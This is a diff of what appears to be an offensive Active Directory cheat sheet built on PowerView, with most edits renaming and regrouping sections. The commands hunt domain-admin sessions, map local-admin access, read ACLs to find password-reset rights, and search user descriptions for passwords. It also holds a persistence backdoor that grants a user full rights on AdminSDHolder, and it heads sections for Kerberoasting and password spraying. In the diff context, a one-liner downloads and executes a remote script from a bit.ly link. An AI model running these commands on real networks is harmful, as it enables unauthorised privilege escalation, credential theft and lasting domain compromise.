@@ -26,7 +26,17 @@ iex (new-Object Net.WebClient).DownloadString('http://bit.ly/28RwLgo'); . .\Powe
 
 ```
 
-## HUNTING USER CREDS
+## ENUM : DOMAIN ADMIN
+```powershell
+# find where DA has logged on / and current user has access
+Invoke-UserHunter
+Invoke-UserHunter -CheckAccess
+
+# get all the effective members of DA groups, 'recursing down'
+Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+```
+
+## ENUM : PRIVILEGED USERS
 ```powershell
 # find computers where the current user is local admin
 Find-LocalAdminAccess
@@ -34,36 +44,38 @@ Find-LocalAdminAccess
 # find local admins on all computers of the domain
 Invoke-EnumerateLocalAdmin
 
-# find where DA has logged on / and current user has access
-Invoke-UserHunter
-Invoke-UserHunter -CheckAccess
-
-# find where a user has logged on
-Invoke-UserHunter -UserName <User>
+# get all the effective members of BO groups, 'recursing down'
+Get-DomainGroupMember -Identity "Backup Operators" -Recurse
 
 # get actively logged users on a computer
 Get-NetLoggedon -ComputerName <Computer>
 
+# find where a user has logged on
+Invoke-UserHunter -UserName <User>
+
 # get last logged users on a computer
 Get-LastLoggedon -ComputerName <Computer>
-```
 
-## HUNTING USER RIGHTS
+# find users who have local admin rights
+Find-GPOComputerAdmin -ComputerName <computer>
 
-```powershell
+# find users who have local admin rights
+Find-GPOLocation -UserName <DA>
 
-# list users/groups ACLs
-# valuable attributes: IdentityReference, ObjectDN, ActiveDirectoryRights
-Get-ObjectAcl -SamAccountName <User>-ResolveGUIDs
+# AllExtendedRights privilege grants both the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All privileges
+
+# list users that can reset password
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword"}
 
 # list users and GPO he can modifiy
 Get-NetGPO | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name}
 
-# list users that can reset password
-Get-NetGPO | %{Get-ObjectAcl -ResolveGUISs -Name $_.Name -RightsFilter "ResetPassword"}
+# list users/groups ACLs
+# valuable attributes: IdentityReference, ObjectDN, ActiveDirectoryRights
+Get-ObjectAcl -SamAccountName <User>-ResolveGUIDs
 ```
 
-## DOMAIN PRIVESC ENUM
+## ENUM : DOMAIN
 
 ```powershell
 Get-NetDomainController
@@ -71,21 +83,11 @@ Get-NetDomainController
 # get the domain policy settings for the passwords: history, complexicity, lockout, clear-text
 (Get-DomainPolicy)."system access"
 
-# get all the effective members of security users groups, 'recursing down'
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-Get-DomainGroupMember -Identity "Backup Operators" -Recurse
-
 # look for the keyword "pass" in the description attribute for each user in the domain
 Find-UserField -SearchField Description -SearchTerm "pass"
 
 # find share folders in the domain
 Invoke-ShareFinder
-
-# find userswho have local admin rights
-Find-GPOComputerAdmin -ComputerName <computer>
-
-# find userswho have local admin rights
-Find-GPOLocation -UserName <DA>
 
 # find linked DA accounts using name correlation
 Get-DomainGroupMember 'Domain Admins' | %{Get-DomainUser $_.membername -LDAPFilter '(displayname=*)'} | %{$a=$_.displayname.split(' ')[0..1] -join ' '; Get-DomainUser -LDAPFilter "(displayname=*$a*)" -Properties displayname,samaccountname}
@@ -139,7 +141,7 @@ Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
 }
 ```
 
-## DOMAIN PERSISTENCY ENUM
+## ENUM: DOMAIN PERSISTENCY
 
 ```powershell
 # enumerate who has rights to the 'matt' user in 'testlab.local', resolving rights GUIDs to names
@@ -155,7 +157,7 @@ Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local'
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
 ```
 
-## FOREST PRIVESC ENUM
+## ENUM: FOREST PRIVESC
 
 ```powershell
 # get the trusts of the current domain/forest
@@ -180,7 +182,7 @@ Find-DomainUserLocation -ComputerUnconstrained -ShowAll
 Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
 ```
 
-## SERVICES LOOTS
+## ENUM: SERVICES LOOTS
 
 ```powershell
 # find all users with an SPN set (likely service accounts)
@@ -206,7 +208,7 @@ Get-NetComputer -OperatingSystem "Windows 2008*" -Ping
 
 ```
 
-## Kerberoasting, Password Spraying
+## ENUM: Kerberoasting, Password Spraying
 
 ```powershell
 # get the last password set of each user in the current domain
